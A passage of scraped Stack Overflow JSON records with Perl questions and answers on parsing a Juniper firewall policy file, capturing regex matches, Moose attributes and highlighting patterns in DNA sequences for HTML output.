source-address g_DMZ_SRV_2_;\n                    destination-address g_DMZ_SRV_3;\n                    application T_22-ssh;\n                }\n                then {\n                    permit;\n                }\n            }\n            policy policy-95 {\n                match {\n                    source-address g_h_OpenMail-Server-2;\n                    source-address 1.2.0.3;\n                    destination-address g_in_DMZ_Exchange-1;\n                    destination-address 10.25.32.64;\n                    application t_1024;\n                }\n                then {\n                    permit;\n                }\n            }\n        }\n\n}\n</code></pre>\n\n<p>and I would like to parse it in Perl, in order to build a hash for example (or simply put conditions to treat the data) that I could exploit afterwards, e.g something like:</p>\n\n<pre><code>Trust-to-DMZ\n      policy-66\n            source =&gt; g_DMZ_SRV\n            destination =&gt; blabla\n      policy-44\n            source =&gt; source1\n                      source2\n                      source3\n            destination =&gt; dest1\n            ports =&gt; port1\nDMZ-to-Trust\n      policy-XX\n</code></pre>\n\n<p>i wanted wanted to know :</p>\n\n<ol>\n<li><p>if you knew some modules help\u00eeng in such a task (i suppose i could use Text::Balanced, i found some examples in a few other posts)</p></li>\n<li><p>if there was some methods/best practices in doing this to avoid dirty work ?</p></li>\n</ol>\n\n<p>i suppose i could \"count\" the number of braces and do loops in loops.. but it would be dirty.</p>\n\n<p>isn't there an easier solution or module doing this automatically ? (like modules exist for XML files for example, <strong>XML::Simple</strong> putting the contents of an XML into a hash, <strong>i would expect something similar for that kind of stuff</strong> ?)</p>\n\n<p>otherwise i'll start coding something dirty and post my progress here</p>\n\n<p>thanks!</p>\n\n<p><strong>edit on June 8th</strong>, just so you know, it works with a dirty dirty dirty code like that (I'm not a developer, apologies), which is not really what I want as it's not adaptable.. and clearly dirty as hell\nyou have been warned! :) so don't look at it if you don't want blood in your eyes</p>\n\n<pre><code>use warnings;\nuse lib '/opt/csm/64-bit/cpan/5.16.3-2013.03/lib';\nuse Data::Dumper;\n\nmy ( $policies_flag, $fromzone_flag, $policy_flag, $match_flag, $zone_flag ) = ( 0,0,0,0,0 );\nmy ( $details_flag, $clos_flag, $then_flag, $permit_flag, $clos2_flag, $final_flag ) = ( 0,0,0,0,0,0 );\n\nmy $fromzone;\nmy $tozone;\n\nmy %pols;\nmy $clos_counter;\n\ndie \"Usage: $0 &lt;path_to_file&gt;\" if $ARGV[0] eq '';\n\nopen D, '&lt;', $ARGV[0] or die \"cannot open $ARGV[0] for read\\n\";\n@data = &lt;D&gt;;\nclose D;\n\n\nOUTER: foreach my $str (@data) {\n\n     next if $str =~ /^$/;\n     next if $str =~ /apply-groups/;\n     chomp $str;\n\nif ( $str =~ /\\s*policies\\s+\\{/ ) {\n        $policies_flag = 1;\n        next OUTER;\n}\n\n\n# policies\nif ($policies_flag == 1) {\n\n    if ($str =~ /from-zone\\s\\S+\\sto-zone\\s\\S+\\s\\{$/) {\n        next if $str =~ /(&lt;|&gt;)/;\n        ( $fromzone, $tozone ) = ( split(/\\s+/,$str) )[2,4];\n        $fromzone_flag = 1;\n        next OUTER;\n    }\n\n    # from-zone\n    if ($fromzone_flag == 1) {\n\n        if ($str =~ /policy\\s+\\S+\\s+\\{/) {\n            $policy_flag = 1;\n            $clos_counter=0;\n            ( $policy_name ) = ( split(/\\s+/, $str) )[2];\n            $pols{$policy_name}{from_zone} = \"$fromzone\";\n            $pols{$policy_name}{to_zone} = \"$tozone\";\n            next OUTER;\n        }\n\n        # pol\n        if ($policy_flag == 1) {\n\n            if ($str =~ /match\\s+\\{/) {\n                $match_flag = 1;\n                next OUTER;\n            }\n\n        }\n\n        # match\n        if ($match_flag == 1) {\n\n            if ($str =~ /\\S+\\s+\\S+;$/) {\n                $details_flag = 1;\n\n                if ($str =~ /source-address/) {\n                    ( $sources ) = ( split(/\\s+/, $str) )[2];\n                    $sources =~ s/;//;\n                    push( @{$pols{$policy_name}{sources}}, \"$sources\");\n                } elsif ($str =~ /destination-address/) {\n                    ( $dests ) = ( split(/\\s+/, $str) )[2];\n                    $dests =~ s/;//;\n                    push( @{$pols{$policy_name}{destinations}}, \"$dests\");\n                } elsif ($str =~ /application/) {\n                    ( $ports ) = ( split(/\\s+/, $str) )[2];\n                    $ports =~ s/;//;\n                    push( @{$pols{$policy_name}{ports}}, \"$ports\");\n                }\n\n                next OUTER;\n            }\n\n        }\n\n        # rest\n        if ($details_flag == 1) {\n\n            if ($str =~ /\\s*\\}\\s*$/) {\n                if ($clos_counter == 0) {\n                    $clos_flag = 1;\n                    $clos_counter++;\n                    next OUTER;\n                }\n            }\n\n        }\n\n        # then\n        if ($clos_flag == 1) {\n\n            if ($str =~ /\\s*then\\s+\\{$/) {\n                $then_flag = 1;\n                next OUTER;\n            }\n\n        }\n\n        # permit\n        if ($then_flag == 1) {\n\n            if ($str =~ /\\s*permit;$/) {\n                $permit_flag = 1;\n                $pols{$policy_name}{action} = ( split(/\\s+/,$str) )[1];\n                next OUTER;\n            }\n\n        }\n\n        # clos2\n        if ($permit_flag == 1) {\n\n            if ($str =~ /\\s*\\}\\s*$/) {\n                if ($clos_counter == 1) {\n                    $clos2_flag = 1;\n                    $clos_counter++;\n                    next OUTER;\n                }\n            }\n\n        }\n\n        # final close\n        if ($clos2_flag == 1) {\n\n            if ($str =~ /\\s*\\}\\s*$/) {\n                if ($clos_counter == 2) {\n                    $final_flag = 1;\n                    $clos_counter++;\n                    next OUTER;\n                }\n            }\n\n        }\n\n        # ultimate zone\n        if ($final_flag == 1) {\n\n            if ($str =~ /\\s*\\}\\s*$/) {\n                if ($clos_counter == 3) {\n                    $zone_flag = 1;\n                    $clos_counter++;\n                    next OUTER;\n                }\n            }\n\n        }\n\n        # ulti pols\n        if ($zone_flag == 1) {\n\n            if ($str =~ /\\s*\\}\\s*$/) {\n                if ($clos_counter == 4) {\n                    $clos_counter++;\n                    last OUTER;\n                }\n            }\n\n        }\n\n\n    }\n\n}\n\n}\n\nprint Dumper(\\%pols);\n</code></pre>\n\n<p>which gives:</p>\n\n<pre><code>$VAR1 = {\n      'policy-68' =&gt; {\n                       'ports' =&gt; [\n                                    'T_22-ssh'\n                                  ],\n                       'sources' =&gt; [\n                                      'g_DMZ_SRV_2_'\n                                    ],\n                       'to_zone' =&gt; 'Blabla',\n                       'from_zone' =&gt; 'DMZ',\n                       'action' =&gt; 'permit;',\n                       'destinations' =&gt; [\n                                           'g_DMZ_SRV_3'\n                                         ]\n                     },\n      'policy-9' =&gt; {\n                      'ports' =&gt; [\n                                   't_1023'\n                                 ],\n                      'sources' =&gt; [\n                                     'g_h_OpenMail-Server'\n                                   ],\n                      'to_zone' =&gt; 'DMZ',\n                      'from_zone' =&gt; 'Trust',\n                      'action' =&gt; 'permit;',\n                      'destinations' =&gt; [\n                                          'g_in_DMZ_Exchange'\n                                        ]\n                    },\n      'policy-66' =&gt; {\n                       'ports' =&gt; [\n                                    'any'\n                                  ],\n                       'sources' =&gt; [\n                                      'g_DMZ_SRV_'\n                                    ],\n                       'to_zone' =&gt; 'DMZ',\n                       'from_zone' =&gt; 'Trust',\n                       'action' =&gt; 'permit;',\n                       'destinations' =&gt; [\n                                           'g_DMZ_SRV'\n                                         ]\n                     },\n      'policy-95' =&gt; {\n                       'ports' =&gt; [\n                                    't_1024'\n                                  ],\n                       'sources' =&gt; [\n                                      'g_h_OpenMail-Server-2',\n                                      '1.2.0.3'\n                                    ],\n                       'to_zone' =&gt; 'Blabla',\n                       'from_zone' =&gt; 'DMZ',\n                       'action' =&gt; 'permit;',\n                       'destinations' =&gt; [\n                                           'g_in_DMZ_Exchange-1',\n                                           '10.25.32.64'\n                                         ]\n                     }\n    };\n</code></pre>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 6, "creation_date": 1496781062, "post_id": 44399291, "comment_id": 75798450, "body": "It is the <code>T</code> from <code>The</code>."}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "reply_to_user": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 1, "creation_date": 1496781181, "post_id": 44399291, "comment_id": 75798512, "body": "As @WiktorStribi\u017cew, it matches the <code>T</code> only. This is because you&#39;re looking for one or more CAPITAL letters consecutively. Once it hits the <code>h</code>, the regex stops matching (and capturing) because the <code>h</code> is lower-case."}, {"owner": {"reputation": 6254, "user_id": 2261424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a0beda634f65f29aace865be9504e5e6?s=128&d=identicon&r=PG", "display_name": "AntonH", "link": "https://stackoverflow.com/users/2261424/antonh"}, "edited": false, "score": 0, "creation_date": 1496781365, "post_id": 44399291, "comment_id": 75798608, "body": "Note that if you change the case of &quot;The&quot; to &quot;the&quot;, it will stop at the &quot;S&quot; of &quot;Steps&quot;."}, {"owner": {"user_type": "does_not_exist", "display_name": "user557597"}, "edited": false, "score": 2, "creation_date": 1496781822, "post_id": 44399291, "comment_id": 75798837, "body": "<code>Shouldn&#39;t the + operator match the entire word &quot;GREAT&quot;?</code> Yes, it will, eventually. If you change it to <code>while ( $data =~ &#47;([A-Z]+)&#47;g ) { print $1,&quot;\\n&quot;; }</code> you will eventually match <code>GREAT</code>.  This is basic stuff. You should read the basics before asking questions. Otherwise, you may get answers you don&#39;t understand, like <i>boundary&#39;s</i> and <i>regex debugging</i> that would be way beyond your comprehension, and totally useless."}], "answers": [{"tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 4, "last_activity_date": 1496781174, "creation_date": 1496781174, "answer_id": 44399340, "question_id": 44399291, "link": "https://stackoverflow.com/questions/44399291/perl-regex-match-incorrect/44399340#44399340", "title": "Perl Regex match incorrect", "body": "<p>The regex engine starts at the left of the string. It tries to match capital letters, at least one and as many as possible. That's the <code>T</code> from <code>The</code>. That's at least one, and then it's done. It never even reaches the <code>GREAT</code>.</p>\n\n<p>You can see that if you run your program with <code>use re 'debug'</code>, which turns on <a href=\"http://perldoc.perl.org/re.html#&#39;debug&#39;-mode\" rel=\"nofollow noreferrer\">regex debugging</a>.</p>\n\n<pre><code>use re 'debug';\n\n\"The 39 Steps - a GREAT book - colours_15\" =~ /([A-Z]+)/;\n</code></pre>\n\n<p>This will write to STDERR:</p>\n\n<pre><code>Compiling REx \"([A-Z]+)\"\nFinal program:\n   1: OPEN1 (3)\n   3:   PLUS (15)\n   4:     ANYOF[A-Z][] (0)\n  15: CLOSE1 (17)\n  17: END (0)\nstclass ANYOF[A-Z][] plus minlen 1 \nMatching REx \"([A-Z]+)\" against \"The 39 Steps - a GREAT book - colours_15\"\nMatching stclass ANYOF[A-Z][] against \"The 39 Steps - a GREAT book - colours_15\" (40 bytes)\n   0 &lt;&gt; &lt;The 39 Ste&gt;         |  1:OPEN1(3)\n   0 &lt;&gt; &lt;The 39 Ste&gt;         |  3:PLUS(15)\n                                  ANYOF[A-Z][] can match 1 times out of 2147483647...\n   1 &lt;T&gt; &lt;he 39 Step&gt;        | 15:  CLOSE1(17)\n   1 &lt;T&gt; &lt;he 39 Step&gt;        | 17:  END(0)\nMatch successful!\nFreeing REx: \"([A-Z]+)\"\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "is_accepted": false, "score": 6, "last_activity_date": 1496825111, "last_edit_date": 1496825111, "creation_date": 1496781196, "answer_id": 44399349, "question_id": 44399291, "link": "https://stackoverflow.com/questions/44399291/perl-regex-match-incorrect/44399349#44399349", "title": "Perl Regex match incorrect", "body": "<p>The <code>T</code> you printed is the first capital letter found by your regex.  It is the <code>T</code> from the first <code>The</code> word.</p>\n\n<p>If you want to match <em>all</em> occurrences of 1+ capital ASCII letter chunks in a larger string, use your pattern with a <code>g</code> (\"global\") modifier: <code>/[A-Z]+/g</code>:</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse feature 'say';\n\n$s = \"The 39 Steps - a GREAT book - colours_15\";\nmy @res = $s =~ /[A-Z]+/g;\nsay \"@res\";\n</code></pre>\n\n<p>See the <a href=\"https://ideone.com/MfXeL4\" rel=\"nofollow noreferrer\">online Perl demo</a> printing <code>T S GREAT</code>.</p>\n\n<p>If you want to find a <em>whole word</em> that only consists of ALLCAPS letters, use</p>\n\n<pre><code>/\\b([A-Z]+)\\b/\n</code></pre>\n\n<p>The <code>\\b</code> is a word boundary and will ensure whole word matches.</p>\n\n<p>Note that you might also match <code>GREAT</code> here by using <code>/([A-Z]{2,})/</code> regex that matches 2 or more capital ASCII letters, but the version with word boundaries looks more practical.</p>\n"}, {"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 0, "last_activity_date": 1496821155, "creation_date": 1496821155, "answer_id": 44406444, "question_id": 44399291, "link": "https://stackoverflow.com/questions/44399291/perl-regex-match-incorrect/44406444#44406444", "title": "Perl Regex match incorrect", "body": "<p>The Perl regex engine is lazy. It will return the leftmost match in your string. As soon as it finds a match, it will stop looking for \"better\" matches.</p>\n\n<p>The regex engine's internal dialogue for this code might go something like this:</p>\n\n<blockquote>\n  <p>Ok, so we're looking for one or more capital letters. Right, so let's start looking at this string. What's the first character? Oh, a capital 'T'. That matches. But we're looking for one or more characters, so keep looking. What's next? A lower-case 'h'. Ok, that doesn't match. Looks like we're done then. The first sequence of one or more capital letters I found was just the letter 'T'. Stick that in <code>$1</code> and it looks like we can knock off early. Who's putting the kettle on?</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 8124106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3ccba11b32feb8abd12ddd845390cc22?s=128&d=identicon&r=PG&f=1", "display_name": "K. Thivagaran", "link": "https://stackoverflow.com/users/8124106/k-thivagaran"}, "is_accepted": false, "score": 1, "last_activity_date": 1496828789, "creation_date": 1496828789, "answer_id": 44409097, "question_id": 44399291, "link": "https://stackoverflow.com/questions/44399291/perl-regex-match-incorrect/44409097#44409097", "title": "Perl Regex match incorrect", "body": "<p>Try This. This will give you perfect result.</p>\n\n<p>my $content = \"The 39 Steps - a GREAT book - colours_15\";</p>\n\n<pre><code>if($content =~m /\\b([A-Z]+)\\b/){\n    print \"Matched $1\\n\";\n}\nelse{\n    print \"No match\\n\";\n}\n</code></pre>\n"}], "owner": {"reputation": 9, "user_id": 8121940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/056bcc4c5faac56f5b7e610bd51ab7db?s=128&d=identicon&r=PG&f=1", "display_name": "jeffreyzhao", "link": "https://stackoverflow.com/users/8121940/jeffreyzhao"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 99, "favorite_count": 0, "answer_count": 4, "score": -6, "last_activity_date": 1496828789, "creation_date": 1496780987, "question_id": 44399291, "link": "https://stackoverflow.com/questions/44399291/perl-regex-match-incorrect", "title": "Perl Regex match incorrect", "body": "<p>I'm a little confused as to why the output to this search is only the capital letter T. Shouldn't the + operator match the entire word \"GREAT\"? Any help is appreciated.</p>\n\n<pre><code>my $content = \"The 39 Steps - a GREAT book - colours_15\";\n\n    if($content =~ /([A-Z]+)/) {\n        print \"Matched $1\\n\";\n    }\n    else {\n        print \"No match\\n\";\n    }\n</code></pre>\n"}, {"tags": ["perl", "methods", "moose"], "answers": [{"tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 2, "last_activity_date": 1496780512, "last_edit_date": 1592644375, "creation_date": 1496780512, "answer_id": 44399172, "question_id": 44398674, "link": "https://stackoverflow.com/questions/44398674/what-method-is-created-for-this-perl/44399172#44399172", "title": "what method is created for this? perl", "body": "<p>This is basic Moose syntax. <code>has</code> is a Moose keyword that defines an attribute in your class. The attributes name is <em>shape</em>, and it <code>is</code> <code>r</code>ead-<code>w</code>rite.</p>\n<p><a href=\"https://metacpan.org/pod/distribution/Moose/lib/Moose/Manual/Attributes.pod\" rel=\"nofollow noreferrer\">It's</a> <a href=\"https://metacpan.org/pod/Moose#has-$name%7C@$names-=%3E-%25options\" rel=\"nofollow noreferrer\">documented</a> <a href=\"https://metacpan.org/pod/Moose::Meta::Attribute\" rel=\"nofollow noreferrer\">in</a> <a href=\"https://metacpan.org/pod/Class::MOP::Attribute\" rel=\"nofollow noreferrer\">multiple</a> <a href=\"https://metacpan.org/pod/distribution/Moose/lib/Moose/Cookbook/Basics/BinaryTree_AttributeFeatures.pod\" rel=\"nofollow noreferrer\">places</a>.</p>\n<blockquote>\n<p><code>has $name|@$names =&gt; %options</code></p>\n<p>This will install an attribute of a given <code>$name</code> into the current class. If the first parameter is an array reference, it will create an attribute for every <code>$name</code> in the list. The <code>%options</code> will be passed to the constructor for Moose::Meta::Attribute (which inherits from Class::MOP::Attribute), so the full documentation for the valid options can be found there.</p>\n</blockquote>\n<p>The <a href=\"https://metacpan.org/pod/MooseX::FollowPBP\" rel=\"nofollow noreferrer\">MooseX::FollowPBP</a> has nothing to do with it directly. It just changes the behavior of Moose, to turn the default accessor <code>$obj-&gt;shape</code> into <code>$obj-&gt;get_shape</code> and <code>$obj-&gt;set_shape</code>, following the suggestion of Damian Conway in his book <em>Perl Best Practices</em>.</p>\n"}], "owner": {"reputation": 303, "user_id": 7048060, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/96a3440d502edb392034a77e4c1d70fe?s=128&d=identicon&r=PG&f=1", "display_name": "Ashley", "link": "https://stackoverflow.com/users/7048060/ashley"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 44, "favorite_count": 0, "closed_date": 1497273820, "answer_count": 1, "score": -6, "last_activity_date": 1496780512, "creation_date": 1496778674, "question_id": 44398674, "link": "https://stackoverflow.com/questions/44398674/what-method-is-created-for-this-perl", "closed_reason": "Not suitable for this site", "title": "what method is created for this? perl", "body": "<p>I need an explanation of this one liner. Is this only calling the set() method? Or something else? </p>\n\n<p>Thanks for the help! </p>\n\n<p><code>has 'shape' =&gt; \n( is =&gt; 'rw' );</code></p>\n\n<p>The object is using MooseX::FollowPBP.</p>\n"}, {"tags": ["html", "perl", "cgi", "bioinformatics"], "comments": [{"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1496762486, "post_id": 44393851, "comment_id": 75787613, "body": "Record the position and length of the match, do your unpack, and then insert the tags in the right places. ... You should provide usable sample data and a self-contained script."}, {"owner": {"reputation": 9, "user_id": 8104317, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/fc3fd5c6d616fd213ad4deaa9278b3f5?s=128&d=identicon&r=PG&f=1", "display_name": "Diesel", "link": "https://stackoverflow.com/users/8104317/diesel"}, "reply_to_user": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1496764970, "post_id": 44393851, "comment_id": 75789286, "body": "I am sorry I thought the code I reported was enough. I have recorded position and length of the matches; how do I unpack and insert tags in the right places?"}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1496765086, "post_id": 44393851, "comment_id": 75789360, "body": "For help on how to formulate a question, see <a href=\"https://stackoverflow.com/help/mcve\">MCVE</a>. See also <a href=\"/a/44394781/100754\">my answer</a>."}], "answers": [{"tags": [], "owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "is_accepted": false, "score": 1, "last_activity_date": 1496769906, "last_edit_date": 1496769906, "creation_date": 1496764837, "answer_id": 44394781, "question_id": 44393851, "link": "https://stackoverflow.com/questions/44393851/highlight-a-matched-pattern-in-a-dna-sequence-with-html-markup-using-perl/44394781#44394781", "title": "Highlight a matched pattern in a DNA sequence with HTML markup using Perl", "body": "<p>The script below uses a single randomly generated DNA sequence of length 243 (generated using <code>http://www.bioinformatics.org/sms2/random_dna.html</code>) and a variable length pattern.</p>\n\n<p>It works by first recording the positions which need to be highlighted instead of changing the sequence string. The highlighting is inserted after the sequence is split into chunks of 50 bases.</p>\n\n<p>The highlighting is done in reverse order to minimize bookkeeping busy work.</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse utf8;\nuse strict;\nuse warnings;\nuse YAML::XS;\n\nmy $PRETTY_WIDTH = 50;\n\n# I am using bold-italic so the highlighting\n# is visible on Stackoverflow, but in real\n# life, this would be something like:\n# my @PRETTY_MARKUP = ('&lt;span class=\"highlighted-match\"&gt;', '&lt;/span&gt;');\n\nmy @PRETTY_MARKUP = ('&lt;b&gt;&lt;i&gt;', '&lt;/i&gt;&lt;/b&gt;');\n\nuse constant { BA\u015e =&gt; 0, SON =&gt; 1, ROW =&gt; 0, COL =&gt; 1 };\n\nmy $sequence = q{ccggtgagacatccagttagttcactgagccgacttgcatcagtcatgcttttccccgtaatgagggccccatattcaggccgtcgtccggaattgtcttggatccggaatgcagcttttctcaccgcttgatgaacattcactgaatatctgacgccgcgaaaacagggtcactagcctgtttccggtcgcccgagaccggcgagtttgtggtatcgcgagcgcccccgggcggtagggtct};\n\nmy $wanted = 'c..?gg';\n\nmy @pos;\n\nwhile ($sequence =~ /($wanted)/g) {\n    push @pos, [ pos($sequence) - length($1), pos($sequence) ];\n}\n\nprint Dump \\@pos;\n\nmy @output = unpack \"(A$PRETTY_WIDTH)*\", $sequence;\n\nprint Dump \\@output;\n\nwhile (my $pos = pop @pos) {\n    my @rc = map pos_to_rc($_, $PRETTY_WIDTH), @$pos;\n    substr($output[ $rc[$_][ROW] ], $rc[$_][COL], 0, $PRETTY_MARKUP[$_]) for SON, BA\u015e;\n}\n\nprint Dump \\@output;\n\nsub pos_to_rc {\n    my $r = int( $_[0] / $_[1] );\n    my $c = $_[0] - $r * $_[1];\n    [ $r, $c ];\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre>C:\\...\\Temp> perl s.pl\n---\n- - 0\n  - 4\n- - 76\n  - 80\n- - 87\n  - 91\n- - 97\n  - 102\n- - 104\n  - 108\n- - 165\n  - 170\n- - 184\n  - 188\n- - 198\n  - 202\n- - 226\n  - 231\n---\n- ccggtgagacatccagttagttcactgagccgacttgcatcagtcatgct\n- tttccccgtaatgagggccccatattcaggccgtcgtccggaattgtctt\n- ggatccggaatgcagcttttctcaccgcttgatgaacattcactgaatat\n- ctgacgccgcgaaaacagggtcactagcctgtttccggtcgcccgagacc\n- ggcgagtttgtggtatcgcgagcgcccccgggcggtagggtct\n---\n- <b><i>ccgg</i></b>tgagacatccagttagttcactgagccgacttgcatcagtcatgct\n- tttccccgtaatgagggccccatatt<b><i>cagg</i></b>ccgtcgt<b><i>ccgg</i></b>aattgt<b><i>ctt\n- gg</i></b>at<b><i>ccgg</i></b>aatgcagcttttctcaccgcttgatgaacattcactgaatat\n- ctgacgccgcgaaaa<b><i>caggg</i></b>tcactagcctgttt<b><i>ccgg</i></b>tcgcccgaga<b><i>cc\n- gg</i></b>cgagtttgtggtatcgcgagcgcc<b><i>cccgg</i></b>gcggtagggtct</pre>            \n\n<p>Especially since this turns out to have been a homework assignment, it is now up to you to take this and apply it to all sequences in your hash table.</p>\n"}], "owner": {"reputation": 9, "user_id": 8104317, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/fc3fd5c6d616fd213ad4deaa9278b3f5?s=128&d=identicon&r=PG&f=1", "display_name": "Diesel", "link": "https://stackoverflow.com/users/8104317/diesel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 104, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1496769906, "creation_date": 1496762214, "last_edit_date": 1496766192, "question_id": 44393851, "link": "https://stackoverflow.com/questions/44393851/highlight-a-matched-pattern-in-a-dna-sequence-with-html-markup-using-perl", "title": "Highlight a matched pattern in a DNA sequence with HTML markup using Perl", "body": "<p>I am working on generating an HTML page using a CGI script in Perl.</p>\n\n<p>I need filter some sequences in order to check whether they contain a specific pattern; if they contain it I need to print those sequences on my page with 50 bases per line, and highlight the pattern in the sequences. My sequences are in an hash called <code>%hash</code>; the keys are the names, the values are the actual sequences.</p>\n\n<pre><code>my %hash2;\nforeach my $key (keys %hash)  {\n    if ($hash{$key} =~ s!(aaagg)!&lt;b&gt;$1&lt;/b&gt;!)  {\n       $hash2{$key} = $hash{$key}\n}\n}\n\nforeach my $key (keys %hash2)  {\n    print \"&lt;p&gt; &lt;b&gt; $key &lt;/b&gt; &lt;/p&gt;\";\n    print \"&lt;p&gt;$_&lt;/p&gt;\\n\" for unpack '(A50)*', $hash2{$key};\n}\n</code></pre>\n\n<p>This method \"does\" the job however if I highlight the pattern \"aaagg\" using this method I am messing up the unpacking of the line (<code>for unpack '(A50)*'</code>); because now the sequences contains the extra characters of the bold tags which are included in the unpacking count. This beside making the lines of different length it is also a big problem if the tag falls between 2 lines due to unpacking 50 characters, it basically remains open and everything after that is bold.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1496752366, "post_id": 44389905, "comment_id": 75779831, "body": "What problems are you having? What have you tried?"}, {"owner": {"reputation": 109, "user_id": 7095322, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/2a2993c68412ce1526b19d682ee5a8d2?s=128&d=identicon&r=PG&f=1", "display_name": "AVS", "link": "https://stackoverflow.com/users/7095322/avs"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1496753196, "post_id": 44389905, "comment_id": 75780468, "body": "I have no experience in Perl and am a little pressed for time: I hope the solution is simple but don&#39;t have the time to teach myself the basics at the moment."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 2, "creation_date": 1496755843, "post_id": 44389905, "comment_id": 75782577, "body": "Posting a question on the internet isn&#39;t the best way to get help if you&#39;re &quot;a little pressed for time&quot;. Can I recommend offering experts money in exchange for their skills?"}], "answers": [{"comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 2, "creation_date": 1496755748, "post_id": 44390102, "comment_id": 75782500, "body": "I haven&#39;t downvoted, but this seems like a really complicated way to write <code>tr&#47;\\t;&#47;;:&#47;</code> :-)"}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, 